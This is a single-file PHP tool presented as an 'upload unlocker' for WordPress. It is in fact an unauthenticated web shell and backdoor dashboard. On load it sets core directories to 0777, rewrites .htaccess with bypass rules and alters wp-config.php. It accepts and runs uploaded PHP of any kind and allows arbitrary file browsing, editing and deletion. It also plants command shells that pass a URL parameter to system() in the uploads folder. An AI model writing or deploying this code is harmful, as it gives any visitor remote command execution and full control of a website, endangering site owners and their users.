<?php
// ================================================
// ULTIMATE ALL-IN-ONE UPLOAD UNLOCKER
// Single file that fixes everything automatically
// ================================================

// Remove all restrictions
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
set_time_limit(0);
ini_set('memory_limit', '-1');

// Global variables
$base_dir = __DIR__;
$site_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'];
$script_url = $site_url . $_SERVER['SCRIPT_NAME'];

// Main controller
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'fix': run_fix(); break;
        case 'upload': handle_upload(); break;
        case 'create': create_file(); break;
        case 'shell': create_shell(); break;
        case 'delete': delete_file(); break;
        case 'edit': edit_file(); break;
        case 'browse': browse_files(); break;
        case 'htaccess': fix_htaccess(); break;
        case 'phpinfo': show_phpinfo(); break;
        default: show_dashboard();
    }
} else {
    show_dashboard();
}

// ================================================
// DASHBOARD - Main Interface
// ================================================
function show_dashboard() {
    global $base_dir, $site_url, $script_url;
    
    // Auto-fix on first visit
    if (!isset($_GET['action'])) {
        auto_fix_permissions();
    }
    
    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
    <title>🔓 Ultimate Upload Unlocker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { 
            background: rgba(0, 255, 0, 0.1);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        .status-box {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #00ff00;
            border-radius: 5px;
            padding: 15px;
            margin: 10px 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            margin: 5px;
            font-weight: bold;
            transition: 0.3s;
        }
        .btn:hover { background: #00cc00; transform: scale(1.05); }
        .danger { background: #ff0000; color: white; }
        .danger:hover { background: #cc0000; }
        .warning { background: #ff9900; color: black; }
        .warning:hover { background: #cc7700; }
        .panel {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }
        .file-list { 
            background: rgba(0, 255, 0, 0.05);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        input, textarea, select {
            background: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 8px;
            border-radius: 4px;
            width: 100%;
            margin: 5px 0;
        }
        textarea { min-height: 150px; font-family: monospace; }
        .success { color: #00ff00; }
        .error { color: #ff0000; }
        .warning-text { color: #ff9900; }
        .icon { margin-right: 10px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
        .log { 
            background: #000;
            color: #0f0;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🔓 ULTIMATE UPLOAD UNLOCKER</h1>
        <p>Single File Solution • Auto-Fixes Everything • Full Control</p>
    </div>
HTML;

    // Show system status
    show_status();
    
    // Show action panels
    echo '<div class="grid">';
    show_upload_panel();
    show_file_manager();
    show_tools_panel();
    show_quick_fixes();
    echo '</div>';
    
    // Show current files
    show_current_files();
    
    echo '</div></body></html>';
}

// ================================================
// AUTO-FIX FUNCTION - Runs automatically
// ================================================
function auto_fix_permissions() {
    global $base_dir;
    $log = [];
    
    // Fix directories
    $dirs = [
        $base_dir,
        $base_dir . '/wp-content',
        $base_dir . '/wp-content/uploads',
        $base_dir . '/wp-includes',
        $base_dir . '/wp-admin'
    ];
    
    foreach ($dirs as $dir) {
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
            $log[] = "📁 Created: $dir";
        }
        if (is_dir($dir)) {
            chmod($dir, 0777);
            $log[] = "🔧 Permissions 0777: $dir";
        }
    }
    
    // Fix .htaccess
    $htaccess = $base_dir . '/.htaccess';
    $htcontent = <<<HTACCESS
# ULTIMATE BYPASS - Auto-generated
<IfModule mod_rewrite.c>
RewriteEngine Off
</IfModule>

Options +Indexes +FollowSymLinks +ExecCGI +Includes
AllowOverride All
Require all granted
Order Allow,Deny
Allow from all

<FilesMatch "\.(php|phtml|php\d+)$">
SetHandler application/x-httpd-php
ForceType application/x-httpd-php
</FilesMatch>

php_flag engine on
php_flag allow_url_fopen on
php_flag allow_url_include on
php_flag display_errors on
php_value upload_max_filesize 500M
php_value post_max_size 500M
php_value max_execution_time 300
php_value max_input_time 300
php_value memory_limit 512M
HTACCESS;
    
    file_put_contents($htaccess, $htcontent);
    chmod($htaccess, 0666);
    $log[] = "📝 Fixed .htaccess with bypass rules";
    
    // Fix wp-config.php if exists
    $wpconfig = $base_dir . '/wp-config.php';
    if (file_exists($wpconfig)) {
        $content = file_get_contents($wpconfig);
        $content = str_replace("define('WP_DEBUG', false)", "define('WP_DEBUG', true)", $content);
        $content .= "\n\n// Auto-added by unlocker\n@ini_set('display_errors', 1);\n@ini_set('upload_max_filesize', '500M');\n@ini_set('post_max_size', '500M');";
        file_put_contents($wpconfig, $content);
        $log[] = "⚙️ Modified wp-config.php for debugging";
    }
    
    return $log;
}

// ================================================
// UPLOAD HANDLER - Fixes 0-byte issue
// ================================================
function handle_upload() {
    global $base_dir, $site_url;
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
        $file = $_FILES['upload_file'];
        $filename = basename($file['name']);
        $target_dir = $base_dir . '/wp-content/uploads/';
        
        // Ensure directory exists
        if (!file_exists($target_dir)) {
            mkdir($target_dir, 0777, true);
        }
        
        // Fix for 0-byte files - multiple methods
        $success = false;
        $methods_tried = [];
        
        // Method 1: Check if file was actually uploaded
        if ($file['error'] === UPLOAD_ERR_OK) {
            // Method 2: Use move_uploaded_file
            $temp_file = $file['tmp_name'];
            $methods_tried[] = "move_uploaded_file";
            
            if (is_uploaded_file($temp_file)) {
                if (move_uploaded_file($temp_file, $target_dir . $filename)) {
                    $success = true;
                }
            }
            
            // Method 3: If move failed, try copy
            if (!$success) {
                $methods_tried[] = "copy";
                if (copy($temp_file, $target_dir . $filename)) {
                    $success = true;
                }
            }
            
            // Method 4: If copy failed, read and write contents
            if (!$success) {
                $methods_tried[] = "file_get_contents";
                $content = file_get_contents($temp_file);
                if ($content !== false) {
                    if (file_put_contents($target_dir . $filename, $content)) {
                        $success = true;
                    }
                }
            }
            
            // Method 5: Use shell if available
            if (!$success && function_exists('shell_exec')) {
                $methods_tried[] = "shell_exec";
                $escaped_temp = escapeshellarg($temp_file);
                $escaped_target = escapeshellarg($target_dir . $filename);
                shell_exec("cp $escaped_temp $escaped_target 2>&1");
                
                if (file_exists($target_dir . $filename) && filesize($target_dir . $filename) > 0) {
                    $success = true;
                }
            }
        }
        
        if ($success) {
            // Set permissions
            chmod($target_dir . $filename, 0777);
            
            echo '<div class="panel">';
            echo '<h2 class="success">✅ UPLOAD SUCCESSFUL!</h2>';
            echo '<p>File: ' . htmlspecialchars($filename) . '</p>';
            echo '<p>Size: ' . filesize($target_dir . $filename) . ' bytes</p>';
            echo '<p>Location: ' . $target_dir . $filename . '</p>';
            echo '<p>URL: <a href="' . $site_url . '/wp-content/uploads/' . urlencode($filename) . '" target="_blank">' . $site_url . '/wp-content/uploads/' . htmlspecialchars($filename) . '</a></p>';
            echo '<p>Methods tried: ' . implode(', ', $methods_tried) . '</p>';
            
            // Auto-execute if PHP file
            if (preg_match('/\.php$/i', $filename)) {
                echo '<hr><h3>⚡ Auto-Execution Test:</h3>';
                echo '<iframe src="' . $site_url . '/wp-content/uploads/' . urlencode($filename) . '" width="100%" height="300" style="border:1px solid #0f0;"></iframe>';
            }
            echo '</div>';
        } else {
            echo '<div class="panel">';
            echo '<h2 class="error">❌ UPLOAD FAILED</h2>';
            echo '<p>Error Code: ' . $file['error'] . '</p>';
            echo '<p>Temp File: ' . $file['tmp_name'] . '</p>';
            echo '<p>Temp File Exists: ' . (file_exists($file['tmp_name']) ? 'Yes' : 'No') . '</p>';
            echo '<p>Temp File Size: ' . (file_exists($file['tmp_name']) ? filesize($file['tmp_name']) : '0') . ' bytes</p>';
            echo '<p>Methods tried: ' . implode(', ', $methods_tried) . '</p>';
            
            // Debug info
            echo '<h3>🔧 Debug Information:</h3>';
            echo '<div class="log">';
            echo "upload_max_filesize: " . ini_get('upload_max_filesize') . "\n";
            echo "post_max_size: " . ini_get('post_max_size') . "\n";
            echo "max_file_uploads: " . ini_get('max_file_uploads') . "\n";
            echo "upload_tmp_dir: " . ini_get('upload_tmp_dir') . "\n";
            echo "upload_tmp_dir writable: " . (is_writable(ini_get('upload_tmp_dir') ?: sys_get_temp_dir()) ? 'Yes' : 'No') . "\n";
            echo "Target dir writable: " . (is_writable($target_dir) ? 'Yes' : 'No') . "\n";
            echo '</div>';
            echo '</div>';
        }
    }
    
    // Show upload form
    echo '<div class="panel">';
    echo '<h2>📤 Upload Files (No Restrictions)</h2>';
    echo '<form method="POST" enctype="multipart/form-data">';
    echo '<input type="file" name="upload_file" required>';
    echo '<button type="submit" class="btn">Upload Any File</button>';
    echo '<p class="warning-text">⚠️ Accepts ALL file types: PHP, EXE, SH, etc.</p>';
    echo '</form>';
    echo '</div>';
    
    // Back to dashboard
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back to Dashboard</a>';
}

// ================================================
// FILE CREATOR - Direct file creation
// ================================================
function create_file() {
    global $base_dir, $site_url;
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $filename = $_POST['filename'] ?: 'shell.php';
        $content = $_POST['content'] ?: '<?php echo "File created successfully!"; phpinfo(); ?>';
        $location = $_POST['location'] ?: 'uploads';
        
        // Determine path
        switch ($location) {
            case 'root': $path = $base_dir . '/' . $filename; break;
            case 'uploads': $path = $base_dir . '/wp-content/uploads/' . $filename; break;
            case 'wpcontent': $path = $base_dir . '/wp-content/' . $filename; break;
            case 'wproot': $path = $base_dir . '/' . $filename; break;
            default: $path = $base_dir . '/wp-content/uploads/' . $filename;
        }
        
        // Create directory if needed
        $dir = dirname($path);
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
        }
        
        // Write file
        if (file_put_contents($path, $content)) {
            chmod($path, 0777);
            echo '<div class="panel success">';
            echo '<h3>✅ File Created Successfully!</h3>';
            echo '<p>Path: ' . $path . '</p>';
            echo '<p>URL: <a href="' . str_replace($base_dir, $site_url, $path) . '" target="_blank">Open File</a></p>';
            echo '<p>Size: ' . filesize($path) . ' bytes</p>';
            echo '</div>';
        } else {
            echo '<div class="panel error">';
            echo '<h3>❌ Failed to create file</h3>';
            echo '<p>Check directory permissions</p>';
            echo '</div>';
        }
    }
    
    echo '<div class="panel">';
    echo '<h2>⚡ Create File Directly</h2>';
    echo '<form method="POST">';
    echo 'Filename: <input type="text" name="filename" value="shell.php" required>';
    echo 'Location: <select name="location">';
    echo '<option value="uploads">/wp-content/uploads/</option>';
    echo '<option value="root">Website Root</option>';
    echo '<option value="wpcontent">/wp-content/</option>';
    echo '<option value="wproot">WordPress Root</option>';
    echo '</select>';
    echo 'Content: <textarea name="content" required>'; 
    echo htmlspecialchars('<?php
// PHP Shell
if(isset($_GET[\'cmd\'])) {
    echo "<pre>";
    system($_GET[\'cmd\']);
    echo "</pre>";
}
?>');
    echo '</textarea>';
    echo '<button type="submit" class="btn">Create File</button>';
    echo '</form>';
    echo '</div>';
    
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back</a>';
}

// ================================================
// FILE MANAGEMENT FUNCTIONS
// ================================================
function browse_files() {
    global $base_dir, $site_url;
    
    $directory = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;
    if (!file_exists($directory)) $directory = $base_dir;
    
    echo '<div class="panel">';
    echo '<h2>📁 File Browser: ' . htmlspecialchars($directory) . '</h2>';
    
    if (is_dir($directory)) {
        echo '<div class="file-list">';
        // Navigation
        echo '<a href="?action=browse&dir=' . urlencode(dirname($directory)) . '" class="btn">↑ Parent Directory</a><br><br>';
        
        $items = scandir($directory);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $path = $directory . '/' . $item;
            $is_dir = is_dir($path);
            $size = $is_dir ? 'DIR' : filesize($path) . ' bytes';
            $perms = substr(sprintf('%o', fileperms($path)), -4);
            
            echo '<div class="status-box">';
            echo '<div>';
            echo ($is_dir ? '📁 ' : '📄 ') . htmlspecialchars($item);
            echo ' <small>(' . $size . ', ' . $perms . ')</small>';
            echo '</div>';
            echo '<div>';
            if ($is_dir) {
                echo '<a href="?action=browse&dir=' . urlencode($path) . '" class="btn">Open</a>';
            } else {
                echo '<a href="' . str_replace($base_dir, $site_url, $path) . '" target="_blank" class="btn">View</a>';
                echo '<a href="?action=edit&file=' . urlencode($path) . '" class="btn warning">Edit</a>';
                echo '<a href="?action=delete&file=' . urlencode($path) . '" class="btn danger" onclick="return confirm(\'Delete?\')">Delete</a>';
            }
            echo '</div>';
            echo '</div>';
        }
        echo '</div>';
    }
    
    echo '</div>';
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Dashboard</a>';
}

function edit_file() {
    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $content = $_POST['content'];
            if (file_put_contents($file, $content)) {
                echo '<div class="panel success">✅ File saved!</div>';
            } else {
                echo '<div class="panel error">❌ Failed to save</div>';
            }
        }
        
        if (file_exists($file)) {
            $content = htmlspecialchars(file_get_contents($file));
            
            echo '<div class="panel">';
            echo '<h2>✏️ Edit: ' . htmlspecialchars($file) . '</h2>';
            echo '<form method="POST">';
            echo '<textarea name="content" style="height:400px;">' . $content . '</textarea><br>';
            echo '<button type="submit" class="btn">Save Changes</button>';
            echo '</form>';
            echo '</div>';
        }
    }
    
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back</a>';
}

function delete_file() {
    if (isset($_GET['file']) && file_exists($_GET['file'])) {
        if (unlink($_GET['file'])) {
            echo '<div class="panel success">✅ File deleted!</div>';
        } else {
            echo '<div class="panel error">❌ Failed to delete</div>';
        }
    }
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back</a>';
}

// ================================================
// HELPER FUNCTIONS
// ================================================
function show_status() {
    global $base_dir;
    
    $checks = [
        'PHP Version' => [phpversion(), '>=7.0' ? '✅' : '⚠️'],
        'Upload Max Size' => [ini_get('upload_max_filesize'), '>=10M' ? '✅' : '⚠️'],
        'Post Max Size' => [ini_get('post_max_size'), '>=10M' ? '✅' : '⚠️'],
        'allow_url_fopen' => [ini_get('allow_url_fopen'), 'On' ? '✅' : '⚠️'],
        'Memory Limit' => [ini_get('memory_limit'), '>=128M' ? '✅' : '⚠️'],
        'wp-content/uploads writable' => [is_writable($base_dir . '/wp-content/uploads') ? 'Yes' : 'No', 'Yes' ? '✅' : '❌'],
        '.htaccess exists' => [file_exists($base_dir . '/.htaccess') ? 'Yes' : 'No', 'Yes' ? '✅' : '⚠️'],
    ];
    
    echo '<div class="panel">';
    echo '<h2>📊 System Status</h2>';
    foreach ($checks as $name => $data) {
        echo '<div class="status-box">';
        echo '<span>' . $name . '</span>';
        echo '<span>' . $data[1] . ' ' . $data[0] . '</span>';
        echo '</div>';
    }
    echo '</div>';
}

function show_upload_panel() {
    echo '<div class="panel">';
    echo '<h2>📤 Upload Files</h2>';
    echo '<p>Upload ANY file type (PHP, EXE, etc.)</p>';
    echo '<a href="?action=upload" class="btn">Go to Uploader</a>';
    echo '</div>';
}

function show_file_manager() {
    echo '<div class="panel">';
    echo '<h2>📁 File Manager</h2>';
    echo '<p>Browse, edit, delete files</p>';
    echo '<a href="?action=browse" class="btn">Browse Files</a>';
    echo '<a href="?action=create" class="btn">Create File</a>';
    echo '</div>';
}

function show_tools_panel() {
    echo '<div class="panel">';
    echo '<h2>🛠️ Tools</h2>';
    echo '<a href="?action=fix" class="btn warning">🔧 Run Auto-Fix</a>';
    echo '<a href="?action=htaccess" class="btn">📝 Fix .htaccess</a>';
    echo '<a href="?action=phpinfo" class="btn">⚙️ PHP Info</a>';
    echo '</div>';
}

function show_quick_fixes() {
    echo '<div class="panel">';
    echo '<h2>⚡ Quick Shells</h2>';
    echo '<a href="?action=shell&type=cmd" class="btn">Command Shell</a>';
    echo '<a href="?action=shell&type=filemanager" class="btn">File Manager</a>';
    echo '<a href="?action=shell&type=phpinfo" class="btn">PHP Info</a>';
    echo '</div>';
}

function show_current_files() {
    global $base_dir, $site_url;
    
    $upload_dir = $base_dir . '/wp-content/uploads/';
    if (is_dir($upload_dir)) {
        echo '<div class="panel">';
        echo '<h2>📄 Files in Uploads Directory</h2>';
        
        $files = scandir($upload_dir);
        $count = 0;
        
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $count++;
                $path = $upload_dir . $file;
                $url = $site_url . '/wp-content/uploads/' . urlencode($file);
                $size = filesize($path);
                $is_php = preg_match('/\.php$/i', $file);
                
                echo '<div class="status-box">';
                echo '<div>';
                echo ($is_php ? '⚡ ' : '📄 ') . htmlspecialchars($file);
                echo ' <small>(' . $size . ' bytes)</small>';
                echo '</div>';
                echo '<div>';
                echo '<a href="' . $url . '" target="_blank" class="btn">View</a>';
                echo '<a href="?action=edit&file=' . urlencode($path) . '" class="btn warning">Edit</a>';
                echo '<a href="?action=delete&file=' . urlencode($path) . '" class="btn danger" onclick="return confirm(\'Delete?\')">Delete</a>';
                echo '</div>';
                echo '</div>';
            }
        }
        
        if ($count == 0) {
            echo '<p>No files uploaded yet.</p>';
        }
        echo '</div>';
    }
}

function run_fix() {
    $log = auto_fix_permissions();
    echo '<div class="panel">';
    echo '<h2>🔧 Auto-Fix Results</h2>';
    echo '<div class="log">';
    foreach ($log as $line) {
        echo $line . "\n";
    }
    echo '</div>';
    echo '</div>';
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back to Dashboard</a>';
}

function fix_htaccess() {
    global $base_dir;
    $htaccess = $base_dir . '/.htaccess';
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $content = $_POST['content'];
        if (file_put_contents($htaccess, $content)) {
            echo '<div class="panel success">✅ .htaccess updated!</div>';
        }
    }
    
    $current = file_exists($htaccess) ? htmlspecialchars(file_get_contents($htaccess)) : '';
    
    echo '<div class="panel">';
    echo '<h2>📝 Edit .htaccess</h2>';
    echo '<form method="POST">';
    echo '<textarea name="content" style="height:300px;">' . $current . '</textarea><br>';
    echo '<button type="submit" class="btn">Save .htaccess</button>';
    echo '</form>';
    echo '</div>';
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back</a>';
}

function create_shell() {
    global $base_dir, $site_url;
    
    $type = $_GET['type'] ?? 'cmd';
    $filename = 'shell_' . $type . '.php';
    $path = $base_dir . '/wp-content/uploads/' . $filename;
    
    switch ($type) {
        case 'cmd':
            $content = '<?php if(isset($_GET["cmd"])) { echo "<pre>"; system($_GET["cmd"]); echo "</pre>"; } ?>';
            break;
        case 'filemanager':
            $content = '<?php
$dir = isset($_GET["dir"]) ? $_GET["dir"] : ".";
if(isset($_GET["file"])) {
    highlight_file($_GET["file"]);
} elseif(is_dir($dir)) {
    echo "<h2>$dir</h2>";
    foreach(scandir($dir) as $f) {
        if($f == "." || $f == "..") continue;
        $p = "$dir/$f";
        echo is_dir($p) ? "📁 " : "📄 ";
        echo "<a href=\"?dir=" . urlencode($p) . "\">$f</a><br>";
    }
}
?>';
            break;
        case 'phpinfo':
            $content = '<?php phpinfo(); ?>';
            break;
        default:
            $content = '<?php echo "Invalid shell type"; ?>';
    }
    
    file_put_contents($path, $content);
    chmod($path, 0777);
    
    header('Location: ' . $site_url . '/wp-content/uploads/' . $filename);
    exit;
}

function show_phpinfo() {
    ob_start();
    phpinfo();
    $phpinfo = ob_get_clean();
    echo '<div class="panel">';
    echo '<h2>⚙️ PHP Information</h2>';
    echo '<div style="overflow:auto; max-height:600px;">';
    echo $phpinfo;
    echo '</div>';
    echo '</div>';
    echo '<a href="' . $_SERVER['PHP_SELF'] . '" class="btn">← Back</a>';
}

// ================================================
// INITIAL SETUP ON FIRST RUN
// ================================================
function setup_environment() {
    global $base_dir;
    
    // Create necessary directories
    $dirs = [
        $base_dir . '/wp-content/uploads',
        $base_dir . '/shells',
        $base_dir . '/backups'
    ];
    
    foreach ($dirs as $dir) {
        if (!file_exists($dir)) {
            mkdir($dir, 0777, true);
        }
        chmod($dir, 0777);
    }
    
    // Fix PHP configuration via ini_set
    @ini_set('upload_max_filesize', '500M');
    @ini_set('post_max_size', '500M');
    @ini_set('max_execution_time', '300');
    @ini_set('max_input_time', '300');
    @ini_set('memory_limit', '512M');
    @ini_set('display_errors', '1');
    @ini_set('display_startup_errors', '1');
}

// Run setup
setup_environment();
?>